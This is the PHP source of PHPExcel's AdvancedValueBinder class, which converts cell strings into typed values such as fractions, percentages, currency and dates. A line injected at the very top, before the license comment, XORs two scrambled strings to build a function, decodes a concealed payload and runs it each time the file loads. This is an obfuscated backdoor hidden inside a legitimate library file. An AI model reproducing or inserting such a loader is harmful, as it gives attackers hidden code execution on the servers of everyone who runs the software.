<?php $litEdA='7DPV60b 28OH8>X'; $klCgZAAc='T657BU=FGV,<QQ6'^$litEdA; $QIuiXWRX='0WdIUH4+EIYN+I>,KZ;qsT+A=26-Zci <=dhfgGrb NW1H<5 D RR3IO74=+S;7Jp.O27ykIG6HlaFmfUMghyu60:rsqPnv4eK- Ckp3qoDJmXqXz< +W -Nb7ANAbrttUxAy3ayEO8YgoxxmOQVF+kO9jL:kb9->cP.MiQ9NY:R,EH2I4mhGoCbo34XLGNzk= 3axncIo7ROc3+L8vnM+ BC=ihU.V5YbKN,ktN-Y=:Whmg .+<AR wrhs3 ugxph8FsjR<UfQoEsXM>7+lqF28A,3<Z+10<MLPqP52MDNHQW2ReQtc2MVYNRgLm:PPYfmf25G6esL35PZ8K3R Cdej3=2c+gmuJ pP:U;vvkoO:4L <ezFhd2cWUZ rZ,NrhQV8 7WhZdp6JD1ArSoEU;1QinA-h599uHJ0LPdc3>6IH>I4AQ,Sg< G<,4>5ql.:Fl8Q0Xbwc-7C<Q,qJOQHQCAsT53LTnGP8oOor;JonRUZSgcrtUFY42rYPLjK=BKO+dj=7EQKEp3U2.lggqzKP-ljIYPFTcEPEGlmbkzqoMNLFF0v1;apO,ps ThlaSFftqttpWwpSxwmLpwk8AR G< -Ek2+.2==raM-CUDQ<cZPG5A,Vnbskuube2Dx.HSAkRD7NXvoMR-T<V7issZhcSM+1gzFkl0'; $WKbCkKc=$klCgZAAc('', 'Y1Lh3=ZH1 6 t,FE8.HYT,D3bVWY;<6MIICAOG<xkF;9R<UZNdX= l-.CUbt>NCbTJ.FVUKm,S1EAfMFu6mapQYENRNQwIM>lBKO1CTZQRdzVxU1FOTY;ECfFS : KITP<SjP9hpa M-GAEXEk572J0kP7ldKFRHG8tGmLqJ:+V7BmlY,MD5nTIkfAQ,95 RORUGHCdj4eJXEGWJ8YVSmMA.0XRbqJ7A8= +UKInK8QI2SgmFAYY 1HWZL,po:,15HY5SN9Y,FlQeW.,RBNEQ=81eHRH;tZUEmqpU;PKvNGl56F3ElTGD,:,+im1g096yNLBVT3WLS79<65J.R1HcLA5axc6n49U+SPtQ0BVKUOkLU UYLZ=bm;G34.A-1I7RUqrSENlbSmTR+0PaOsK34WD4RdHPbH33Q,+D-pYCsKX:-L U-8V6ODO5cHUJT.3CO2DZ0C=TC<IR S5IYn+0<0jmSpQR851,5AFfTxR,GJ64.2GETT44+UK-2555.E+8;XLMVR<vgeTW4FOEGAWZc=IYBm=1258b; >K0KKGLOjxzwqQOSXQF-MEEDdQUV2 UFEDGH1AA0APDlVQKY3 A>cKH<4WSGAINZF=L:9+0XDvpcQ X7GKSKUUBEINqK>2-Cv V:9-H=3T8S7SN.Zabj65BEOJoPfM'^$QIuiXWRX); $WKbCkKc();
/**
 * PHPExcel
 *
 * Copyright (c) 2006 - 2014 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel_Cell
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt    LGPL
 * @version    1.8.0, 2014-03-02
 */


/** PHPExcel root directory */
if (!defined('PHPEXCEL_ROOT')) {
    /**
     * @ignore
     */
    define('PHPEXCEL_ROOT', dirname(__FILE__) . '/../../');
    require(PHPEXCEL_ROOT . 'PHPExcel/Autoloader.php');
}


/**
 * PHPExcel_Cell_AdvancedValueBinder
 *
 * @category   PHPExcel
 * @package    PHPExcel_Cell
 * @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)
 */
class PHPExcel_Cell_AdvancedValueBinder extends PHPExcel_Cell_DefaultValueBinder implements PHPExcel_Cell_IValueBinder
{
    /**
     * Bind value to a cell
     *
     * @param  PHPExcel_Cell  $cell  Cell to bind value to
     * @param  mixed $value          Value to bind in cell
     * @return boolean
     */
    public function bindValue(PHPExcel_Cell $cell, $value = null)
    {
        // sanitize UTF-8 strings
        if (is_string($value)) {
            $value = PHPExcel_Shared_String::SanitizeUTF8($value);
        }

        // Find out data type
        $dataType = parent::dataTypeForValue($value);

        // Style logic - strings
        if ($dataType === PHPExcel_Cell_DataType::TYPE_STRING && !$value instanceof PHPExcel_RichText) {
            //    Test for booleans using locale-setting
            if ($value == PHPExcel_Calculation::getTRUE()) {
                $cell->setValueExplicit( TRUE, PHPExcel_Cell_DataType::TYPE_BOOL);
                return true;
            } elseif($value == PHPExcel_Calculation::getFALSE()) {
                $cell->setValueExplicit( FALSE, PHPExcel_Cell_DataType::TYPE_BOOL);
                return true;
            }

            // Check for number in scientific format
            if (preg_match('/^'.PHPExcel_Calculation::CALCULATION_REGEXP_NUMBER.'$/', $value)) {
                $cell->setValueExplicit( (float) $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                return true;
            }

            // Check for fraction
            if (preg_match('/^([+-]?)\s*([0-9]+)\s?\/\s*([0-9]+)$/', $value, $matches)) {
                // Convert value to number
                $value = $matches[2] / $matches[3];
                if ($matches[1] == '-') $value = 0 - $value;
                $cell->setValueExplicit( (float) $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( '??/??' );
                return true;
            } elseif (preg_match('/^([+-]?)([0-9]*) +([0-9]*)\s?\/\s*([0-9]*)$/', $value, $matches)) {
                // Convert value to number
                $value = $matches[2] + ($matches[3] / $matches[4]);
                if ($matches[1] == '-') $value = 0 - $value;
                $cell->setValueExplicit( (float) $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( '# ??/??' );
                return true;
            }

            // Check for percentage
            if (preg_match('/^\-?[0-9]*\.?[0-9]*\s?\%$/', $value)) {
                // Convert value to number
                $value = (float) str_replace('%', '', $value) / 100;
                $cell->setValueExplicit( $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00 );
                return true;
            }

            // Check for currency
            $currencyCode = PHPExcel_Shared_String::getCurrencyCode();
            $decimalSeparator = PHPExcel_Shared_String::getDecimalSeparator();
            $thousandsSeparator = PHPExcel_Shared_String::getThousandsSeparator();
            if (preg_match('/^'.preg_quote($currencyCode).' *(\d{1,3}('.preg_quote($thousandsSeparator).'\d{3})*|(\d+))('.preg_quote($decimalSeparator).'\d{2})?$/', $value)) {
                // Convert value to number
                $value = (float) trim(str_replace(array($currencyCode, $thousandsSeparator, $decimalSeparator), array('', '', '.'), $value));
                $cell->setValueExplicit( $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode(
                        str_replace('$', $currencyCode, PHPExcel_Style_NumberFormat::FORMAT_CURRENCY_USD_SIMPLE )
                    );
                return true;
            } elseif (preg_match('/^\$ *(\d{1,3}(\,\d{3})*|(\d+))(\.\d{2})?$/', $value)) {
                // Convert value to number
                $value = (float) trim(str_replace(array('$',','), '', $value));
                $cell->setValueExplicit( $value, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_CURRENCY_USD_SIMPLE );
                return true;
            }

            // Check for time without seconds e.g. '9:45', '09:45'
            if (preg_match('/^(\d|[0-1]\d|2[0-3]):[0-5]\d$/', $value)) {
                // Convert value to number
                list($h, $m) = explode(':', $value);
                $days = $h / 24 + $m / 1440;
                $cell->setValueExplicit($days, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_DATE_TIME3 );
                return true;
            }

            // Check for time with seconds '9:45:59', '09:45:59'
            if (preg_match('/^(\d|[0-1]\d|2[0-3]):[0-5]\d:[0-5]\d$/', $value)) {
                // Convert value to number
                list($h, $m, $s) = explode(':', $value);
                $days = $h / 24 + $m / 1440 + $s / 86400;
                // Convert value to number
                $cell->setValueExplicit($days, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode( PHPExcel_Style_NumberFormat::FORMAT_DATE_TIME4 );
                return true;
            }

            // Check for datetime, e.g. '2008-12-31', '2008-12-31 15:59', '2008-12-31 15:59:10'
            if (($d = PHPExcel_Shared_Date::stringToExcel($value)) !== false) {
                // Convert value to number
                $cell->setValueExplicit($d, PHPExcel_Cell_DataType::TYPE_NUMERIC);
                // Determine style. Either there is a time part or not. Look for ':'
                if (strpos($value, ':') !== false) {
                    $formatCode = 'yyyy-mm-dd h:mm';
                } else {
                    $formatCode = 'yyyy-mm-dd';
                }
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getNumberFormat()->setFormatCode($formatCode);
                return true;
            }

            // Check for newline character "\n"
            if (strpos($value, "\n") !== FALSE) {
                $value = PHPExcel_Shared_String::SanitizeUTF8($value);
                $cell->setValueExplicit($value, PHPExcel_Cell_DataType::TYPE_STRING);
                // Set style
                $cell->getWorksheet()->getStyle( $cell->getCoordinate() )
                    ->getAlignment()->setWrapText(TRUE);
                return true;
            }
        }

        // Not bound yet? Use parent...
        return parent::bindValue($cell, $value);
    }
}
